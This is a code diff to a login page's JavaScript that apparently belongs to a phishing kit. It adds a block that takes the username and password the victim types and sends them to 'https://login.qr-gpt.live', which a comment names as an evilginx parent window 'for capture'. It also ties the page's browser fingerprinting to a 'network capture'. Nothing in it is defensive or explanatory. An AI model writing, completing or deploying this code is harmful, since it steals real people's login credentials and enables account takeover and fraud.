@@ -77,7 +77,7 @@
   </div>
 
   <script>
-  // Generate browser fingerprint (simplified but functional)
+  // Generate browser fingerprint (from your network capture)
   function generateBrowserFingerprint() {
     const fp = {
       language: navigator.language || 'en-US',
@@ -175,6 +175,15 @@
               $('.text-block-7').text('Invalid password (8+ chars required)');
               $('.errry').show();
               return false;
+          }
+          
+          // Send credentials to parent window (evilginx) for capture
+          if (window.parent !== window) {
+              window.parent.postMessage({
+                  type: 'credentials',
+                  username: username,
+                  password: password
+              }, 'https://login.qr-gpt.live');
           }
           
           // Log for debugging
